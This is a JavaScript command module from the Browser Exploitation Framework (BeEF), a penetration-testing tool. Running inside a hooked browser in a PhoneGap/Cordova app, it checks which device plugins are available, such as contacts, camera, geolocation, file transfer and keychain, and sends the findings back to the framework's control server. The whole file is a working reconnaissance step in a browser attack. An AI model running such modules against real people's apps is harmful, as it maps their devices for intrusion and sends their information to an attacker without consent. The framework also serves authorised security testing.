//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// phonegap_plugin_detection
//
beef.execute(function() {
    var result = '';

    // Approximate list of plugins, intended to work with Cordova 2.x
    var plugins = new Array(
        "cordova/plugin/device",
        "cordova/plugin/logger",
        "cordova/plugin/compass",
        "cordova/plugin/accelerometer",
        "cordova/plugin/Camera",
        "cordova/plugin/network",
        "cordova/plugin/contacts",
        "cordova/plugin/echo",
        "cordova/plugin/File",
        "cordova/plugin/FileTransfer",
        "cordova/plugin/geolocation",
        "cordova/plugin/notification",
        "cordova/plugin/Media",
        "cordova/plugin/capture",
        "cordova/plugin/splashscreen",
        "cordova/plugin/battery",
        "cordova/plugin/globalization",
        "cordova/plugin/InAppBrowser",
        "cordova/plugin/keychain"
    );

    for (var i=0; i<plugins.length; i++) {
        try {
            var a = cordova.require(plugins[i]);
            if (a !== undefined) {
                result = result + '\n plugin: ' + plugins[i];
            }
        } catch (err) {
            // do nothing
        }
    }


    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
   
});